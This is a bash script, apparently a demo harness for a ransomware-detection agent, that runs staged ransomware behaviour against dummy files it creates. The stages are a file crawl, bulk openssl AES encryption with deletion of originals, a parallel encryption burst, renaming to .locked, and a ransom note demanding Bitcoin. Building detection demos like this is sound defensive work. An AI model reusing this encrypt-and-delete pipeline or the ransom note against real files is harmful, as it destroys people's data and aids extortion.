#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# CCF Agent — Video Demo Attack Script
#
# Stages (each press of Enter advances to next):
#   0. Setup          — create realistic target files
#   1. Reconnaissance — slow directory crawl            → NORMAL scores
#   2. Staging        — read acceleration + entropy     → WARNING scores
#   3. Encryption     — sequential openssl sweep        → ALERT scores
#   4. Burst          — parallel multi-process flood    → sustained ALERT
#   5. Ransom drop    — rename + ransom note
#
# Usage:
#   ./demo_attack.sh           # interactive (presenter-paced)
#   ./demo_attack.sh auto      # fully automatic (timed delays)
#   ./demo_attack.sh cleanup   # remove test directory
# ─────────────────────────────────────────────────────────────────────────────
set -uo pipefail

# ── Config ────────────────────────────────────────────────────────────────────
TARGET_DIR="/home/arjun/Desktop/ccf-agent-nixos/ransomware_test/demo"
MODE="${1:-interactive}"   # interactive | auto | cleanup

# ── ANSI colours ──────────────────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[0;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

# ── Helpers ───────────────────────────────────────────────────────────────────
banner() {
    local color="$1"; shift
    echo
    echo -e "${color}${BOLD}╔══════════════════════════════════════════════════════╗${RESET}"
    printf "${color}${BOLD}║  %-52s  ║${RESET}\n" "$*"
    echo -e "${color}${BOLD}╚══════════════════════════════════════════════════════╝${RESET}"
    echo
}

step() { echo -e "  ${CYAN}›${RESET} $*"; }
ok()   { echo -e "  ${GREEN}✓${RESET} $*"; }
warn() { echo -e "  ${YELLOW}⚠${RESET}  $*"; }
alert(){ echo -e "  ${RED}${BOLD}✖  $*${RESET}"; }

pause() {
    if [[ "$MODE" == "interactive" ]]; then
        echo
        echo -e "  ${DIM}── Press Enter to continue ──────────────────────────────${RESET}"
        read -r
    else
        sleep "${1:-3}"
    fi
}

progress() {
    local label="$1" total="$2" delay="$3"
    local filled=0
    for i in $(seq 1 "$total"); do
        filled=$(( i * 40 / total ))
        local bar
        bar=$(printf '%0.s█' $(seq 1 $filled))$(printf '%0.s░' $(seq 1 $(( 40 - filled ))))
        printf "\r  ${DIM}[${RESET}${GREEN}%s${RESET}${DIM}]${RESET} ${DIM}%s %d/%d${RESET}" \
               "$bar" "$label" "$i" "$total"
        sleep "$delay"
    done
    echo
}

# ── Cleanup ───────────────────────────────────────────────────────────────────
do_cleanup() {
    echo -e "${DIM}Removing $TARGET_DIR ...${RESET}"
    rm -rf "$TARGET_DIR"
    ok "Cleaned up."
    exit 0
}

[[ "$MODE" == "cleanup" ]] && do_cleanup

trap 'echo; warn "Interrupted — cleaning up..."; rm -rf "$TARGET_DIR"; exit 1' INT TERM

# ─────────────────────────────────────────────────────────────────────────────
#  PHASE 0 — Setup
# ─────────────────────────────────────────────────────────────────────────────
banner "$CYAN" "PHASE 0 — Environment Setup"

step "Creating target directory: $TARGET_DIR"
rm -rf "$TARGET_DIR"
mkdir -p "$TARGET_DIR"/{documents,images,finance,backups}

step "Generating documents (50)..."
for i in $(seq 1 50); do
    printf "CONFIDENTIAL\nDocument %03d\n%s\n" "$i" \
        "$(head -c 512 /dev/urandom | base64 | head -c 400)" \
        > "$TARGET_DIR/documents/report_$i.docx"
    printf "Quarter,Revenue,Cost\n%d,%d,%d\n" "$i" "$((RANDOM % 90000 + 10000))" "$((RANDOM % 50000 + 5000))" \
        > "$TARGET_DIR/finance/spreadsheet_$i.xlsx"
done

step "Generating images (30)..."
for i in $(seq 1 30); do
    head -c 2048 /dev/urandom > "$TARGET_DIR/images/photo_$i.jpg"
    head -c 1024 /dev/urandom > "$TARGET_DIR/images/screenshot_$i.png"
done

step "Generating backups and databases (10)..."
for i in $(seq 1 10); do
    printf "-- DB dump %d\nINSERT INTO users VALUES (%d,'user%d@corp.com');\n" \
        "$i" "$i" "$i" > "$TARGET_DIR/backups/db_backup_$i.sql"
done
echo "archive content" > "$TARGET_DIR/backups/backup.tar.gz"

total=$(find "$TARGET_DIR" -type f | wc -l)
ok "Created $total target files across 4 directories"

# ─────────────────────────────────────────────────────────────────────────────
#  PHASE 1 — Reconnaissance  (expect: NORMAL / low WARNING on dashboard)
# ─────────────────────────────────────────────────────────────────────────────
banner "$GREEN" "PHASE 1 — Reconnaissance  [expect: NORMAL]"
step "Slow directory crawl — enumerating target files..."

find "$TARGET_DIR" -type f > /tmp/ccf_demo_filelist.txt
file_count=$(wc -l < /tmp/ccf_demo_filelist.txt)
step "Found $file_count files. Reading metadata..."

# Slow sequential reads — low field activity
while IFS= read -r f; do
    cat "$f" > /dev/null 2>&1
    sleep 0.08
done < <(head -20 /tmp/ccf_demo_filelist.txt)

step "Scanning for high-value extensions..."
for ext in docx xlsx pdf sql jpg png; do
    count=$(find "$TARGET_DIR" -name "*.$ext" | wc -l)
    step "  .${ext} → ${count} files"
    sleep 0.2
done

ok "Reconnaissance complete — enumerating ${file_count} targets"

# ─────────────────────────────────────────────────────────────────────────────
#  PHASE 2 — Staging  (expect: WARNING scores on dashboard)
# ─────────────────────────────────────────────────────────────────────────────
banner "$YELLOW" "PHASE 2 — Staging  [expect: WARNING]"
warn "Accelerating file access rate..."

step "Rapid read sweep across all target files..."
progress "reading" 80 0.03

find "$TARGET_DIR" -type f | while read -r f; do
    cat "$f" > /dev/null 2>&1
    touch "$f"
    sleep 0.015
done

step "Writing staging markers..."
for i in $(seq 1 15); do
    head -c 64 /dev/urandom | base64 >> "$TARGET_DIR/documents/report_$i.docx"
    sleep 0.02
done

step "Copying files to staging area..."
mkdir -p "$TARGET_DIR/.staging"
find "$TARGET_DIR/finance" -type f | head -10 | while read -r f; do
    cp "$f" "$TARGET_DIR/.staging/$(basename "$f").tmp"
    sleep 0.02
done

warn "Field entropy rising — CCF agent should register WARNING"

# ─────────────────────────────────────────────────────────────────────────────
#  PHASE 3 — Encryption Sweep  (expect: ALERT scores)
# ─────────────────────────────────────────────────────────────────────────────
banner "$RED" "PHASE 3 — Encryption Sweep  [expect: ALERT]"
alert "Beginning sequential AES-256 encryption of all targets..."

step "Encrypting documents..."
find "$TARGET_DIR/documents" -type f | while read -r f; do
    openssl enc -aes-256-cbc -pbkdf2 -salt \
        -in "$f" -out "${f}.enc" \
        -pass pass:x9Kp2mQvLw 2>/dev/null
    rm -f "$f"
    sleep 0.04
done
ok "Documents encrypted"

step "Encrypting finance files..."
find "$TARGET_DIR/finance" -type f | while read -r f; do
    openssl enc -aes-256-cbc -pbkdf2 -salt \
        -in "$f" -out "${f}.enc" \
        -pass pass:x9Kp2mQvLw 2>/dev/null
    rm -f "$f"
    sleep 0.04
done
ok "Finance files encrypted"

step "Encrypting images..."
find "$TARGET_DIR/images" -type f | while read -r f; do
    openssl enc -aes-256-cbc -pbkdf2 -salt \
        -in "$f" -out "${f}.enc" \
        -pass pass:x9Kp2mQvLw 2>/dev/null
    rm -f "$f"
    sleep 0.02
done
ok "Images encrypted"

alert "ALERT threshold crossed — agent should fire SIGKILL / QUARANTINE"

# ─────────────────────────────────────────────────────────────────────────────
#  PHASE 4 — Parallel Burst  (sustained ALERT, multiple processes)
# ─────────────────────────────────────────────────────────────────────────────
banner "$RED" "PHASE 4 — Parallel Burst  [expect: sustained ALERT]"
alert "Spawning 6 parallel encryption processes..."

mkdir -p "$TARGET_DIR/.burst"

# Re-seed burst targets
for i in $(seq 1 60); do
    printf "BURST TARGET %03d\n%s\n" "$i" \
        "$(head -c 256 /dev/urandom | base64)" \
        > "$TARGET_DIR/.burst/target_$i.dat"
done

# Launch parallel workers
for worker in $(seq 1 6); do
    (
        start=$(( (worker - 1) * 10 + 1 ))
        end=$(( worker * 10 ))
        for i in $(seq "$start" "$end"); do
            f="$TARGET_DIR/.burst/target_$i.dat"
            [[ -f "$f" ]] || continue
            openssl enc -aes-256-cbc -pbkdf2 -salt \
                -in "$f" -out "${f}.enc" \
                -pass pass:burst_$(( RANDOM )) 2>/dev/null
            rm -f "$f"
            sleep 0.01
        done
    ) &
done

step "Workers running — waiting for completion..."
progress "burst encrypting" 20 0.1
wait
ok "Parallel burst complete"

alert "CCF field nodes at maximum activity — scores should be 0.6+"

# ─────────────────────────────────────────────────────────────────────────────
#  PHASE 5 — Ransom Drop  (final payload delivery)
# ─────────────────────────────────────────────────────────────────────────────
banner "$RED" "PHASE 5 — Ransom Note Drop"

step "Renaming all encrypted files with .locked extension..."
find "$TARGET_DIR" -name "*.enc" | while read -r f; do
    mv "$f" "${f%.enc}.locked"
    sleep 0.005
done

locked=$(find "$TARGET_DIR" -name "*.locked" | wc -l)
alert "Renamed $locked files → .locked"

step "Dropping ransom note..."
cat > "$TARGET_DIR/RECOVER_YOUR_FILES.txt" <<'EOF'
!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

All your documents, images, and databases have been encrypted
with AES-256-CBC. Without the decryption key, recovery is impossible.

To recover your files:
  1. Send 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf6N
  2. Email proof of payment to: recover@[REDACTED].onion
  3. You will receive your decryption key within 24 hours

WARNING: Do not attempt to decrypt files yourself.
WARNING: Do not contact law enforcement.

Files encrypted: SEE FILELIST.txt
Deadline: 72 hours

  — CRYPTOLOCK v4.2
EOF

cat > "$TARGET_DIR/FILELIST.txt" <<EOF
Encrypted files ($(date)):
$(find "$TARGET_DIR" -name "*.locked" | sed 's|.*/||')
EOF

ok "Ransom note written"

# ─────────────────────────────────────────────────────────────────────────────
#  Summary
# ─────────────────────────────────────────────────────────────────────────────
banner "$CYAN" "Demo Complete"

echo -e "  ${BOLD}Stats:${RESET}"
echo -e "  ${DIM}Encrypted + locked files :${RESET} $(find "$TARGET_DIR" -name "*.locked" | wc -l)"
echo -e "  ${DIM}Target directory         :${RESET} $TARGET_DIR"
echo
echo -e "  ${GREEN}${BOLD}CCF Agent should have fired:${RESET}"
echo -e "  ${GREEN}  • NORMAL${RESET}   during Phase 1 (slow recon)"
echo -e "  ${YELLOW}  • WARNING${RESET}  during Phase 2 (staging sweep)"
echo -e "  ${RED}  • ALERT${RESET}    during Phases 3–5 (encryption + burst)"
echo
echo -e "  ${DIM}Run with 'cleanup' argument to remove test files.${RESET}"
echo
